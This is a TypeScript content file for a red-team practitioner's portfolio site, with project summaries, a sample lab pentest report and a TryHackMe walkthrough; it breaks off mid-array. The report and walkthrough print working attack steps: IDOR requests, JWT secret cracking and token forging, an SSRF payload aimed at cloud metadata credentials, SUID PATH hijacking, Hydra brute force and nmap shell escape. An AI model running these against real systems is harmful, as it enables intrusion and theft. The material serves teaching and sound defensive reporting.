// All portfolio content lives here — edit this file to update the site.

export const profile = {
  name: 'Giridharan K',
  shortName: 'GK',
  headline: 'Red Team & Offensive Security Specialist',
  roles: [
    'Red Team Operator',
    'Penetration Tester',
    'Web & API Security Researcher',
    'Active Directory Attacker',
    'Full-Stack & AI (MCP) Builder',
  ],
  intro:
    'I break systems to make them stronger. Focused on Active Directory exploitation, web & API attacks and threat intelligence — and I engineer the security tooling and interfaces that go with it.',
  location: 'Erode, Tamil Nadu, India',
  mapUrl: 'https://www.google.com/maps?q=11.340891581138985,77.71727908101471',
  email: 'giridharank790@gmail.com',
  phone: '+91 790 423 9322',
  phoneHref: 'tel:+917904239322',
  resume: '/giridharan.pdf',
  githubUsername: 'nextboxis',
  tryHackMeUsername: 'giridharank790',
  tryHackMeBadgeUrl: 'https://tryhackme-badges.s3.amazonaws.com/giridharank790.png',
  mediumUrl: 'https://medium.com/@giridharank790',
  socials: [
    { label: 'GitHub', handle: 'nextboxis', url: 'https://github.com/nextboxis' },
    { label: 'LinkedIn', handle: 'giridharan-k1315', url: 'https://linkedin.com/in/giridharan-k1315' },
    { label: 'TryHackMe', handle: 'giridharank790', url: 'https://tryhackme.com/p/giridharank790' },
    { label: 'Medium', handle: 'giridharank790', url: 'https://medium.com/@giridharank790' },
    { label: 'Instagram', handle: 'encrypted_peace', url: 'https://www.instagram.com/encrypted_peace' },
  ],
}

export const stats = [
  { value: '40+', label: 'TryHackMe labs solved', sub: 'Top 260K+ · Bronze League' },
  { value: '32+', label: 'Public GitHub repos', sub: 'Security, Rust, Python & AI' },
  { value: '25', label: 'Verified certifications', sub: 'Security, Cloud & AI' },
  { value: '6', label: 'Industry simulations', sub: 'Internships & Forage' },
]

export const about = {
  paragraphs: [
    "I'm a Cyber Security Researcher with an offensive, red-team mindset. Most of my time goes into breaking and defending real-world attack surfaces — Active Directory attack paths, OWASP web & API exploitation, network attacks and binary analysis — practised daily on TryHackMe and in custom labs.",
    'I also build production software and write technical breakdowns on Medium. I engineer zero-dependency security tools in Python and Rust, AI-powered threat detection engines with FastAPI and machine learning, Model Context Protocol (MCP) servers for autonomous agents, and clean React + TypeScript interfaces.',
  ],
  killChain: [
    { step: '01', phase: 'Recon & OSINT', detail: 'Nmap, Masscan, BloodHound AD graphs & attack surface mapping' },
    { step: '02', phase: 'Web & Initial Access', detail: 'SQLi, BOLA/IDOR, XSS/CSRF, SSRF, Burp Suite Pro & custom payloads' },
    { step: '03', phase: 'AD & PrivEsc', detail: 'Kerberoasting, Pass-the-Hash, Token Impersonation & ROP chains' },
    { step: '04', phase: 'Defense & Hardening', detail: 'CIS Linux baselines, DNS Sinkholing, ML threat triage & Zero-Trust' },
  ],
  education: [
    {
      degree: 'M.Sc. Computer Technology',
      school: 'Sri Kirana Art and Science College',
      period: '2026 – 2027',
      current: true,
    },
    {
      degree: 'B.Sc. Computer Science & Applications',
      school: 'Kongu Arts & Science College, Bharathiar University',
      period: '2023 – 2026',
      current: false,
    },
    {
      degree: 'Higher Secondary Certificate (HSC)',
      school: 'Vidya Saggar School',
      period: '2021 – 2023',
      current: false,
    },
  ],
}

export type SkillGroup = {
  title: string
  icon: string
  focus: 'offense' | 'defense' | 'build'
  items: string[]
}

export const skills: SkillGroup[] = [
  {
    title: 'Red Team & Active Directory',
    icon: 'crosshair',
    focus: 'offense',
    items: ['Mimikatz / LSASS', 'Kerberoasting', 'AS-REP Roasting', 'Pass-the-Hash', 'Pass-the-Ticket', 'BloodHound', 'Token Impersonation', 'Havoc & Sliver C2'],
  },
  {
    title: 'Web & API Exploitation',
    icon: 'globe-lock',
    focus: 'offense',
    items: ['OWASP Top 10', 'BOLA / IDOR', 'SQL Injection', 'XSS / CSRF', 'SSRF', 'Auth Bypass', 'Burp Suite Pro', 'OWASP ZAP'],
  },
  {
    title: 'Network & Wireless Attacks',
    icon: 'wifi',
    focus: 'offense',
    items: ['Nmap / Masscan', 'ARP Spoofing / MITM', 'Bettercap', 'DNS Poisoning', 'Aircrack-ng', 'Scapy', 'VLAN Hopping', 'Wireshark'],
  },
  {
    title: 'Binary Exploitation & RE',
    icon: 'binary',
    focus: 'offense',
    items: ['Ghidra', 'GDB + PEDA', 'Buffer Overflow', 'ROP Chains', 'Shellcode', 'Format Strings', 'PE / ELF Triage', 'Metasploit'],
  },
  {
    title: 'Defense, Cloud & Hardening',
    icon: 'shield-check',
    focus: 'defense',
    items: ['Linux Hardening', 'CIS Benchmarks', 'Incident Response', 'AWS IAM / S3', 'Azure Entra ID', 'Docker Isolation', 'Zero Trust', 'MITRE ATT&CK'],
  },
  {
    title: 'Crypto & Automation',
    icon: 'key-round',
    focus: 'defense',
    items: ['Python Exploit Scripting', 'Bash Automation', 'AES / RSA', 'SHA-256 / HMAC', 'Regex IOC Hunting', 'JWT / CSP / CORS', 'Rate Limiting / WAF'],
  },
  {
    title: 'Full-Stack Development',
    icon: 'code',
    focus: 'build',
    items: ['React', 'TypeScript', 'JavaScript', 'HTML / CSS', 'Python 3.12', 'Rust', 'FastAPI', 'Flask', 'MongoDB', 'Git'],
  },
  {
    title: 'AI & Machine Learning',
    icon: 'cpu',
    focus: 'build',
    items: ['Model Context Protocol', 'scikit-learn', 'Random Forest', 'XGBoost + SHAP', 'ResNet-50 / CNN', 'Shannon Entropy', 'NVD CVE API'],
  },
]

export type ProjectCategory = 'AI & Threat Intel' | 'Offense & Linux' | 'Network & Forensics'

export type ProjectUseCase = {
  role: string
  scenario: string
}

export type Project = {
  id: string
  name: string
  tag: string
  projectType: string
  period: string
  category: ProjectCategory
  summary: string
  description: string
  problem: string
  solution: string
  useCases: ProjectUseCase[]
  metrics: string[]
  highlights: string[]
  tech: string[]
  repo: string
  snippet: string
  featured?: boolean
}

export const projectCategories: ProjectCategory[] = ['AI & Threat Intel', 'Offense & Linux', 'Network & Forensics']

export const projects: Project[] = [
  {
    id: 'nexshield',
    name: 'NexShield',
    tag: 'DLP & Threat Intel',
    projectType: '9-Engine AI Threat Intelligence, Recon & DLP Platform',
    period: 'Oct 2025 – Feb 2026',
    category: 'AI & Threat Intel',
    featured: true,
    summary:
      'Automates Nmap reconnaissance across 28+ service signatures and runs a 9-engine ML & DLP analysis pipeline mapped to MITRE ATT&CK.',
    description:
      'NexShield is a full-stack AI threat intelligence and Data Loss Prevention (DLP) platform built to unify automated network reconnaissance, vulnerability matching, and behavioral payload inspection into a single workflow.',
    problem:
      'Security analysts and developers often rely on fragmented Nmap scans, manually cross-reference CVEs one by one on NVD, and lack inline DLP checks to stop sensitive data leaks or malicious URLs before they leave the perimeter.',
    solution:
      'Automates Nmap reconnaissance across 28+ sensitive service signatures and feeds results into a 9-engine pipeline covering port risk scoring, version vulnerability matching (Log4Shell, Heartbleed, SambaCry), default credential checks, and Random Forest / XGBoost severity classification—caching NVD CVE responses in MongoDB to cut external lookups by 80%.',
    useCases: [
      {
        role: 'SOC Analysts & Threat Hunters',
        scenario: 'Automatically map exposed services and open ports to MITRE ATT&CK techniques with ML severity scoring instead of manual CVE triage.',
      },
      {
        role: 'Enterprise DLP & AppSec Teams',
        scenario: 'Inspect outbound payloads, URLs, and IOCs in real time via JWT-hardened FastAPI microservices to block sensitive data exfiltration.',
      },
      {
        role: 'Vulnerability Assessors',
        scenario: 'Run repeatable 9-engine perimeter assessments with cached NVD intelligence that responds 80% faster during large subnet scans.',
      },
    ],
    metrics: ['9 Analysis Engines', '28+ Service Signatures', '80% Fewer CVE Lookups', 'MITRE ATT&CK Mapped'],
    highlights: [
      '9-engine analysis pipeline: port risk scoring, version CVE matching (Log4Shell, Heartbleed, SambaCry), and default credential detection',
      'Trained Random Forest & XGBoost classifiers for threat severity and cached NVD CVE feeds in MongoDB (cutting lookups by 80%)',
      'Real-time DLP policy enforcement & hardened FastAPI backend with JWT auth, rate limiting, strict CORS, and CSP headers',
    ],
    tech: ['Python', 'FastAPI', 'MongoDB', 'scikit-learn', 'XGBoost', 'MITRE ATT&CK'],
    repo: 'https://github.com/nextboxis/NexShield',
    snippet: '$ nexshield scan --target 10.10.14.0/24 --engines all --mitre-map\n[9-ENGINE] 28 sigs checked | CVE cache hit: 80% | RF Severity: CRITICAL (T1190)',
  },
  {
    id: 'matazero',
    name: 'MataZero',
    tag: 'Forensics & OSINT',
    projectType: '21-Subcommand Offline Image Forensics & Anti-Tracking CLI',
    period: '2026',
    category: 'Network & Forensics',
    featured: true,
    summary:
      'Fully offline 21-subcommand forensics CLI that extracts 7-tier metadata, attributes stripped images to camera hardware, and detects tampering.',
    description:
      'MataZero is an offline digital forensics, OSINT, and privacy sanitization toolkit designed to inspect, attribute, verify, and scrub image and document evidence without ever touching cloud APIs.',
    problem:
      'Uploading sensitive evidence to online metadata viewers violates operational security, while adversaries routinely strip EXIF headers or use spliced and AI-generated images to hide camera origin and manipulate evidence.',
    solution:
      'Executes a 100% offline 7-tier extraction pipeline across JPEG, PNG, TIFF/RAW, WebP, HEIC, and PDF files. Even after metadata is wiped, it attributes images to source hardware by matching quantization tables, Huffman tables, and chroma subsampling against a 22+ device corpus, and flags manipulation via 3 independent forensic signals.',
    useCases: [
      {
        role: 'DFIR & OSINT Investigators',
        scenario: 'Attribute metadata-stripped evidence photos back to specific camera/phone models and maintain courtroom-ready SHA-256 hash-chained audit logs.',
      },
      {
        role: 'Media Authenticity & Threat Analysts',
        scenario: 'Detect image splicing and AI-generated media using JPEG ghost double-compression, CFA Bayer demosaicing periodicity, and copy-move clone detection.',
      },
      {
        role: 'Privacy-Conscious Researchers & Red Teamers',
        scenario: 'Sanitize PDFs and images by rebuilding clean file containers stripped of hidden EXIF, XMP, GPS, and serial tracking artifacts.',
      },
    ],
    metrics: ['21 CLI Subcommands', '7-Tier Extraction Pipeline', '22+ Device Signatures', 'SHA-256 Chain of Custody'],
    highlights: [
      '21-subcommand offline CLI running a 7-tier forensic pipeline across JPEG, PNG, TIFF/RAW, WebP, HEIC, and PDF evidence',
      'Hardware camera attribution after metadata stripping via quantization tables, Huffman tables, and chroma subsampling (22+ device corpus)',
      'Tamper & AI detection via JPEG ghost double-compression, CFA Bayer demosaicing periodicity, and copy-move clone detection',
      'Enforces forensic chain of custody with SHA-256 hash-chained audit logs, HMAC-signed authorization scopes, and sandboxing',
    ],
    tech: ['Python', 'JPEG/EXIF Internals', 'Ollama', 'SQLite', 'Digital Forensics'],
    repo: 'https://github.com/nextboxis/matazero',
    snippet: '$ matazero analyze evidence.jpg --attribute-device --detect-tamper --audit-log\n[FORENSICS] Quantization match: iPhone 15 Pro (98.4%) | CFA/Ghost: CLEAN | SHA-256 logged',
  },
  {
    id: 'dns-sinkhole',
    name: 'DNS Sinkhole',
    tag: 'Network Security',
    projectType: 'Dual-Engine DNS Interception & Botnet DGA Surveillance Platform',
    period: 'Dec 2025 – Mar 2026',
    category: 'Network & Forensics',
    featured: true,
    summary:
      'Real-time Scapy/TShark DNS interception platform that catches algorithmically generated (DGA) botnet domains using Shannon entropy and inline quarantine.',
    description:
      'DNS Sinkhole is a live network threat surveillance and DNS interception system built to detect and sever command-and-control (C2) beacons, DGA domains, and DNS tunneling across modern transport protocols.',
    problem:
      'Modern malware and botnets bypass static domain blocklists by using Domain Generation Algorithms (DGA) to rotate through thousands of random domains daily and hide C2 traffic inside encrypted DNS transports (DoT, DoH, DoQ).',
    solution:
      'Combines a dual-engine Scapy/TShark packet capture pipeline with real-time Shannon entropy scoring, DNS tunneling heuristics, and suspicious TLD detection to quarantine malicious queries inline (0.0.0.0) across 4 transport protocols, complete with drag-and-drop PCAP forensic replay.',
    useCases: [
      {
        role: 'Blue Teams & Network Defenders',
        scenario: 'Block zero-day botnet C2 check-ins and high-entropy DGA domains at the DNS resolver layer before static threat feeds even list them.',
      },
      {
        role: 'Incident Responders & Forensic Analysts',
        scenario: 'Drag and drop historical PCAP captures into the dashboard to replay DNS traffic timelines and isolate compromised internal endpoints.',
      },
      {
        role: 'Enterprise & Home-Lab Security Admins',
        scenario: 'Monitor encrypted DNS visibility across DNS-over-TCP, DoT, DoH, and DoQ with live block-ratio telemetry.',
      },
    ],
    metrics: ['Scapy + TShark Dual Engine', '4 Protocols (TCP/DoT/DoH/DoQ)', 'Live Shannon Entropy', 'PCAP Forensic Replay'],
    highlights: [
      'Real-time DNS interception with Scapy/TShark dual-engine capture and inline domain quarantine (0.0.0.0)',
      'Detects Domain Generation Algorithm (DGA) botnets via live Shannon entropy scoring, DNS tunneling patterns, and TLD heuristics',
      'Covers 4 transport protocols (DNS-over-TCP, DoT, DoH, DoQ) and features drag-and-drop PCAP forensic replay',
    ],
    tech: ['Python', 'Scapy', 'TShark', 'MongoDB', 'Shannon Entropy', 'React UI'],
    repo: 'https://github.com/nextboxis/DNS-Sinkhole',
    snippet: '$ sudo python3 sinkhole.py --engine scapy-tshark --protocols tcp,dot,doh,doq --entropy 4.1\n[SINKHOLE] Quarantined DGA "x9k2m8a1p0z.ru" (H=4.49) -> 0.0.0.0 | PCAP logged',
  },
  {
    id: 'zeno-mcp',
    name: 'Zeno-MCP',
    tag: 'AI Security & MCP',
    projectType: 'Security-Scoped Model Context Protocol (MCP) Server',
    period: '2026',
    category: 'AI & Threat Intel',
    featured: true,
    summary:
      'Capability-sandboxed MCP server exposing local security, recon, and filesystem tools to AI agents behind strict path and schema guards.',
    description:
      'Zeno-MCP is a security-first Model Context Protocol server that bridges autonomous LLM agents to local system tools, reconnaissance utilities, and file workflows without sacrificing host isolation.',
    problem:
      'Granting AI agents direct shell or filesystem access creates severe security risks—a single prompt injection or hallucinated parameter can trigger path traversal, unauthorized file reads, or destructive command execution.',
    solution:
      'Wraps 100+ local capabilities behind a strict JSON-RPC / MCP boundary that enforces deterministic JSON schema validation, canonical path-traversal sandboxing, and scoped execution policies on every single tool invocation.',
    useCases: [
      {
        role: 'AI & Autonomous Agent Developers',
        scenario: 'Connect Claude, Cursor, or custom LLM orchestrators to local developer and security tools with guaranteed sandbox boundaries.',
      },
      {
        role: 'AI-Assisted Penetration Testers',
        scenario: 'Let AI copilots invoke scoped recon and workspace inspection tools safely during authorized security assessments.',
      },
      {
        role: 'DevSecOps Engineers',
        scenario: 'Standardize and audit every tool call made by internal AI automation pipelines using structured JSON-RPC logs.',
      },
    ],
    metrics: ['100+ Scoped Capabilities', 'Path-Traversal Sandbox', 'JSON-RPC / MCP Standard', 'Strict Schema Guard'],
    highlights: [
      'JSON-RPC / Model Context Protocol bridge for safe, deterministic LLM tool-calling',
      'Enforces canonical path-traversal sandboxing and strict schema validation on every tool invocation',
      'Exposes modular security reconnaissance, workspace analysis, and file-system telemetry workflows',
    ],
    tech: ['Python', 'Rust', 'TypeScript', 'MCP', 'JSON-RPC'],
    repo: 'https://github.com/nextboxis/zeno-mcp',
    snippet: '$ zeno-mcp serve --transport stdio --sandbox strict\n[MCP_READY] 100 capability-scoped tools registered with path guard',
  },
  {
    id: 'library-skill-agents',
    name: 'Library Skill Agents',
    tag: 'Rust Agent Suite',
    projectType: 'Native Rust Autonomous Multi-Agent Security & Systems Dispatcher',
    period: 'Oct 2025 – Feb 2026',
    category: 'AI & Threat Intel',
    featured: true,
    summary:
      'High-speed native Rust multi-agent router dispatching offensive recon, code auditing, and systems engineering agents in under a millisecond.',
    description:
      'Library Skill Agents is a pure native Rust multi-agent skill ecosystem that orchestrates specialized Cyber Warfare, Systems Engineering, and Security Auditing agents with zero runtime overhead.',
    problem:
      'Python- and Node-based multi-agent frameworks suffer from heavy memory consumption, slow cold starts, and runtime overhead when dispatching high-frequency security auditing and systems engineering workflows.',
    solution:
      'Built in native Rust on the Tokio async runtime with zero-copy JSON-RPC parsing, routing tasks to specialized domain agents in sub-millisecond latency while reducing memory footprint by 65% compared to interpreted runtimes.',
    useCases: [
      {
        role: 'Red Teamers & Security Auditors',
        scenario: 'Dispatch dedicated offensive recon and static code-auditing agents concurrently at native binary speed.',
      },
      {
        role: 'Rust & Systems Engineers',
        scenario: 'Automate Cargo workspace checks, architecture validation, and documentation indexing with minimal CPU/RAM overhead.',
      },
      {
        role: 'CI/CD Security Pipelines',
        scenario: 'Embed a single self-contained Rust binary into build pipelines for automated pre-merge security verification.',
      },
    ],
    metrics: ['<1ms Dispatch Latency', '65% Lower Memory', '100% Native Rust', 'Tokio Async Runtime'],
    highlights: [
      'Native Rust multi-agent router for offensive recon, code auditing, and systems automation',
      'Deterministic capability sandboxing and sub-millisecond skill dispatch on the Tokio runtime',
      'Cuts memory footprint by 65% compared to Python agent runners while maintaining full MCP compatibility',
    ],
    tech: ['Rust', 'Tokio', 'MCP', 'AI Agents', 'Linux'],
    repo: 'https://github.com/nextboxis/library-skill-agents',
    snippet: '$ cargo run --release -- dispatch --agent cyber-operator --target api.corp.local\n[AGENT_OK] Dispatched Rust Cyber Operator (0.4ms) -> 4 findings triaged',
  },
  {
    id: 'pishentry',
    name: 'Pishentry',
    tag: 'Phishing Defense',
    projectType: 'Multi-Modal Anti-Phishing & Credential-Harvesting Interception Suite',
    period: '2025 – 2026',
    category: 'AI & Threat Intel',
    summary:
      'Detects cloned login portals, Punycode homograph domains, and rogue credential POST endpoints using DOM heuristics, TLS fingerprinting, and ResNet-50.',
    description:
      'Pishentry is an automated phishing intelligence and interception engine that analyzes suspicious URLs across visual, structural, and cryptographic layers to stop credential harvesting.',
    problem:
      'Signature-based URL blocklists consistently miss zero-hour phishing kits deployed on fresh domains using Punycode homographs, automated Let’s Encrypt TLS certificates, and pixel-perfect clones of corporate SSO portals.',
    solution:
      'Combines DOM form/script heuristics, TLS certificate fingerprinting, and ResNet-50 CNN visual similarity scoring to catch deceptive login pages, cross-origin credential POST actions, and JavaScript keyloggers in real time.',
    useCases: [
      {
        role: 'SOC Teams & Incident Responders',
        scenario: 'Automatically enrich user-reported phishing URLs via REST API with visual clone scores and DOM indicator breakdowns.',
      },
      {
        role: 'Brand & Corporate Security Teams',
        scenario: 'Spot Punycode homograph domains and lookalike Microsoft 365 / Google Workspace login portals before employees get tricked.',
      },
      {
        role: 'Email & Web Gateway Integrations',
        scenario: 'Pre-screen suspicious links in inbound emails to block credential-harvesting forms at click time.',
      },
    ],
    metrics: ['ResNet-50 Visual Match', 'Punycode Homograph Detection', 'DOM + TLS Fingerprinting', 'SOC Enrichment API'],
    highlights: [
      'Combines DOM heuristics, TLS fingerprinting, and ResNet-50 visual similarity to detect cloned login pages',
      'Flags Punycode homograph domains, rogue credential POST endpoints, and obfuscated JS keyloggers',
      'Exposes a FastAPI REST interface tailored for automated SOC playbook enrichment',
    ],
    tech: ['Python', 'FastAPI', 'ResNet-50 CNN', 'Threat Intel'],
    repo: 'https://github.com/nextboxis/Pishentry',
    snippet: '$ pishentry inspect --target "https://micros0ft-login.com"\n[ALERT] Punycode homograph + rogue credential POST detected (99.1%)',
  },
  {
    id: 'xping',
    name: 'xPing',
    tag: 'Linux Security',
    projectType: 'Zero-Dependency Linux Security Auditing & CIS Hardening CLI',
    period: '2025 – 2026',
    category: 'Offense & Linux',
    summary:
      'Portable Linux security auditing and CIS hardening toolkit built 100% on the Python standard library—runs on any box with zero pip dependencies.',
    description:
      'xPing is a modular Linux security auditing, hardening verification, and host reconnaissance CLI engineered exclusively with the Python standard library for instant deployment on restricted systems.',
    problem:
      'During live incident response, air-gapped server audits, or post-exploitation assessments, production Linux machines rarely have internet access or permission to install external Python packages and heavy compliance agents.',
    solution:
      'Written entirely using Python’s built-in standard library (zero external dependencies) so a single script can be dropped onto any Linux distribution to audit kernel sysctl flags, SSH/PAM hardening, rogue SUID/SGID binaries, and open ports against CIS benchmarks.',
    useCases: [
      {
        role: 'Linux Sysadmins & Infrastructure Engineers',
        scenario: 'Audit air-gapped or minimal production servers against CIS Level 1/2 hardening baselines without installing third-party agents.',
      },
      {
        role: 'Penetration Testers & Red Teamers',
        scenario: 'Quickly enumerate local privilege escalation vectors including misconfigured SUID binaries, weak PAM rules, and exposed internal sockets.',
      },
      {
        role: 'DFIR & Blue Team Responders',
        scenario: 'Generate instant host security posture scores and actionable remediation reports during live triage.',
      },
    ],
    metrics: ['0 External Dependencies', 'CIS Benchmark Auditing', 'SUID / PAM / SSH Checks', 'Air-Gap Ready'],
    highlights: [
      'Zero external dependencies—built strictly on the Python standard library so it runs on any air-gapped Linux host',
      'Audits kernel sysctl parameters, PAM/SSH configurations, rogue SUID/SGID binaries, and listening network sockets',
      'Outputs structured CIS hardening scores with copy-paste remediation commands',
    ],
    tech: ['Python Stdlib', 'Linux Kernel', 'CIS Benchmarks', 'Hardening'],
    repo: 'https://github.com/nextboxis/xping',
    snippet: '$ ./xping --audit-all --cis-level 2\n[PASS] Kernel sysctl (18/18) | SSH PermitRootLogin=no | 0 rogue SUIDs',
  },
  {
    id: 'blackarch',
    name: 'BlackArch',
    tag: 'Red Team Tooling',
    projectType: 'Automated Red Team Attack Box & Lab Provisioning Suite',
    period: '2025 – 2026',
    category: 'Offense & Linux',
    summary:
      'Reproducible Bash orchestration suite that turns a fresh Linux install into a pre-configured Red Team operator box for AD, Web, and OSINT engagements.',
    description:
      'BlackArch is an automated provisioning and environment orchestration suite designed to build standardized, OPSEC-ready Red Team and penetration testing workstations in minutes.',
    problem:
      'Manually provisioning a new disposable attack VM or C2 operator workstation before every engagement wastes hours fixing broken tool dependencies, BloodHound/Neo4j configs, and network routing rules.',
    solution:
      'Automates end-to-end installation and configuration of modular offensive profiles (Active Directory, Web/API, OSINT, Wireless), setting up BloodHound, Impacket, Responder, Ghidra, custom recon aliases, and isolated lab routing in one reproducible run.',
    useCases: [
      {
        role: 'Red Team Operators & Pentesters',
        scenario: 'Spin up a clean, engagement-specific attack box with pre-verified AD and web exploitation toolchains in minutes.',
      },
      {
        role: 'CTF Players & Security Lab Builders',
        scenario: 'Keep a version-controlled, reproducible offensive Linux setup across laptops, cloud VMs, and local lab environments.',
      },
    ],
    metrics: ['One-Command Provisioning', 'AD + Web + OSINT Profiles', 'Isolated Lab Routing', 'Reproducible Setup'],
    highlights: [
      'Reproducible one-command provisioning of Active Directory, Web/API, OSINT, and wireless pentest toolchains',
      'Pre-configures BloodHound ingestion, Impacket, Responder, custom recon aliases, and hardened terminal workflows',
      'Sets up isolated lab routing and packet-crafting environments for safe C2 and exploit testing',
    ],
    tech: ['BlackArch Linux', 'Bash', 'Active Directory Tools', 'OPSEC Routing'],
    repo: 'https://github.com/nextboxis/blackarch',
    snippet: '$ sudo ./deploy-blackarch.sh --profile redteam-ad\n[OK] Provisioned: bloodhound, impacket, responder, ghidra, burpsuite',
  },
]

export type PentestFinding = {
  id: string
  title: string
  severity: 'Critical' | 'High' | 'Medium'
  cvss: string
  vector: string
  cwe: string
  endpoint: string
  impact: string
  poc: string
  remediation: string
}

export const samplePentestReport = {
  reportId: 'GK-VAPT-2026-04',
  title: 'Enterprise SaaS API & Cloud Perimeter — Red Team VAPT Report',
  client: 'Sanitized FinTech Target (Authorized Lab Engagement)',
  date: '2026',
  leadAuditor: 'Giridharan K — Red Team & Offensive Security Specialist',
  methodology: 'OWASP WSTG v4.2 · OWASP API Top 10 (2023) · PTES · MITRE ATT&CK',
  executiveSummary:
    'During a 5-day black/grey-box assessment of the target FinTech REST API and Linux perimeter host, 4 exploitable vulnerabilities were identified, chained from an unauthenticated Broken Object-Level Authorization (BOLA) flaw to full root privilege escalation via a misconfigured SUID binary.',
  metrics: [
    { label: 'Critical (CVSS 9.0+)', count: 1 },
    { label: 'High (CVSS 7.0–8.9)', count: 2 },
    { label: 'Medium (CVSS 4.0–6.9)', count: 1 },
    { label: 'Remediated & Re-tested', count: '100%' },
  ],
  findings: [
    {
      id: 'VULN-01',
      title: 'Broken Object-Level Authorization (BOLA / IDOR) on Financial Statements API',
      severity: 'Critical',
      cvss: '9.1',
      vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
      cwe: 'CWE-639 (OWASP API1:2023)',
      endpoint: 'GET /api/v2/accounts/{account_id}/statements',
      impact:
        'Any authenticated low-privilege user can enumerate sequential `account_id` values to download PII, tax documents, and transaction ledgers belonging to any customer.',
      poc: `GET /api/v2/accounts/100842/statements HTTP/1.1
Host: api.target-fintech.local
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... (User ID: 100999)

HTTP/1.1 200 OK
Content-Type: application/json
{
  "account_id": 100842,
  "holder": "redacted-executive@target.local",
  "balance_inr": "4,82,910.00",
  "tax_pan": "ABCDE1234F"
}`,
      remediation:
        'Enforce server-side tenant & user ownership validation in the database query (`WHERE account_id = :id AND owner_user_id = :jwt_sub`) and migrate sequential integer IDs to UUIDv4.',
    },
    {
      id: 'VULN-02',
      title: 'JWT Algorithm Confusion & Weak HMAC Signing Secret',
      severity: 'High',
      cvss: '8.2',
      vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N',
      cwe: 'CWE-347 (Improper Verification of Cryptographic Signature)',
      endpoint: 'POST /api/v2/auth/token/refresh',
      impact:
        'The JWT HS256 signing secret was dictionary-crackable offline via Hashcat (`-m 16500`), enabling an attacker to forge administrative tokens (`"role": "superadmin"`).',
      poc: `$ hashcat -m 16500 captured_jwt.txt rockyou.txt
eyJhbGciOiJIUzI1NiJ9... : secret_signing_key:dev_jwt_2024
# Forged Admin Payload -> {"sub": "100999", "role": "superadmin", "exp": 1893456000}`,
      remediation:
        'Rotate to asymmetric RS256 / EdDSA keypairs with a minimum 256-bit CSPRNG secret, explicitly whitelist allowed algorithms (`algorithms=["RS256"]`), and enforce short token TTLs.',
    },
    {
      id: 'VULN-03',
      title: 'Server-Side Request Forgery (SSRF) via Webhook Preview Endpoint',
      severity: 'High',
      cvss: '7.5',
      vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N',
      cwe: 'CWE-918 (SSRF)',
      endpoint: 'POST /api/v2/integrations/webhook-test',
      impact:
        'The backend URL fetcher follows user-supplied URLs without RFC1918 / link-local IP filtering, allowing extraction of internal Redis & cloud metadata (`169.254.169.254`).',
      poc: `POST /api/v2/integrations/webhook-test HTTP/1.1
Content-Type: application/json

{"target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role"}`,
      remediation:
        'Resolve DNS prior to connection, block private/link-local CIDRs (`127.0.0.0/8`, `10.0.0.0/8`, `169.254.169.254/32`), disable HTTP redirects, and enforce IMDSv2 hop-limit = 1.',
    },
    {
      id: 'VULN-04',
      title: 'Local Privilege Escalation via Legacy SUID Binary on Worker Node',
      severity: 'Medium',
      cvss: '6.5',
      vector: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
      cwe: 'CWE-250 (Execution with Unnecessary Privileges)',
      endpoint: 'Linux Host: /usr/local/bin/backup-runner (SUID root)',
      impact:
        'A custom SUID root binary invoked `tar` without an absolute path, allowing PATH hijacking from a low-privileged container/shell user to obtain `uid=0(root)`.',
      poc: `$ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/backup-runner
$ echo '/bin/sh -p' > /tmp/tar && chmod +x /tmp/tar
$ PATH=/tmp:$PATH /usr/local/bin/backup-runner -> # id: uid=0(root)`,
      remediation:
        'Remove the SUID bit (`chmod u-s /usr/local/bin/backup-runner`), invoke system binaries via absolute paths (`/bin/tar`), and use scoped `sudoers` rules or Linux capabilities.',
    },
  ] as PentestFinding[],
}

export type CtfWalkthrough = {
  id: string
  title: string
  platform: string
  category: string
  difficulty: 'Medium' | 'Hard'
  mitre: string
  summary: string
  steps: { stage: string; detail: string; cmd: string }[]
  remediation: string
  tags: string[]
}

export const ctfWalkthroughs: CtfWalkthrough[] = [
  {
    id: 'mr-robot-ctf',
    title: 'Mr. Robot CTF — WordPress RCE to SUID Root PrivEsc',
    platform: 'TryHackMe · Verified Badge',
    category: 'Linux Privilege Escalation',
    difficulty: 'Medium',
    mitre: 'T1190 / T1548.001',
    summary:
      'Full compromise of the Mr. Robot target machine: enumerating hidden robots.txt artifacts, dictionary credential stuffing on WP-Admin, injecting a PHP reverse shell, cracking MD5 user hashes, and abusing a legacy SUID Nmap binary for root.',
    steps: [
      {
        stage: '01 / Recon & Directory Discovery',
        detail: 'Scanned open HTTP/HTTPS ports with Nmap and discovered robots.txt exposing fsociety.dic and key-1-of-3.txt.',
        cmd: '$ gobuster dir -u http://10.10.x.x -w common.txt\n/robots.txt (Status: 200) -> fsociety.dic (858,160 words)',
      },
      {
        stage: '02 / WordPress Auth & RCE Shell',
        detail: 'Deduplicated fsociety.dic (`sort -u`), enumerated user `elliot`, brute-forced WP-Login with Hydra, and injected a reverse shell via the 404.php theme template.',
        cmd: '$ hydra -l elliot -P fsociety_uniq.dic 10.10.x.x http-post-form\n[80][http-post-form] login: elliot   password: ER28-0652',
      },
      {
        stage: '03 / Lateral Movement to user `robot`',
        detail: 'Located `/home/robot/password.raw-md5`, cracked the MD5 digest to pivot from `daemon` to `robot`.',
        cmd: '$ cat /home/robot/password.raw-md5\nrobot:c3fcd3d76192e4007dfb496cca67e13b ->abcdefghijklmnopqrstuvwxyz',
      },
      {
        stage: '04 / SUID Nmap Interactive Root Escalation',
        detail: 'Enumerated SUID binaries (`find / -perm -4000 2>/dev/null`) and leveraged `/usr/local/bin/nmap --interactive` (`!sh`) to spawn a root shell.',
        cmd: '$ /usr/local/bin/nmap --interactive\nnmap> !sh\n# id -> uid=0(root) gid=0(root) groups=0(root)',
      },
    ],
    remediation:
      'Strip unnecessary SUID bits (`chmod u-s /usr/local/bin/nmap`), disable WordPress theme/plugin file editing (`DISALLOW_FILE_EDIT`), and enforce rate-limiting on authentication endpoints.',
    tags: ['TryHackMe', 'WordPress RCE', 'SUID PrivEsc', 'Hydra', 'Nmap'],
  },
  {
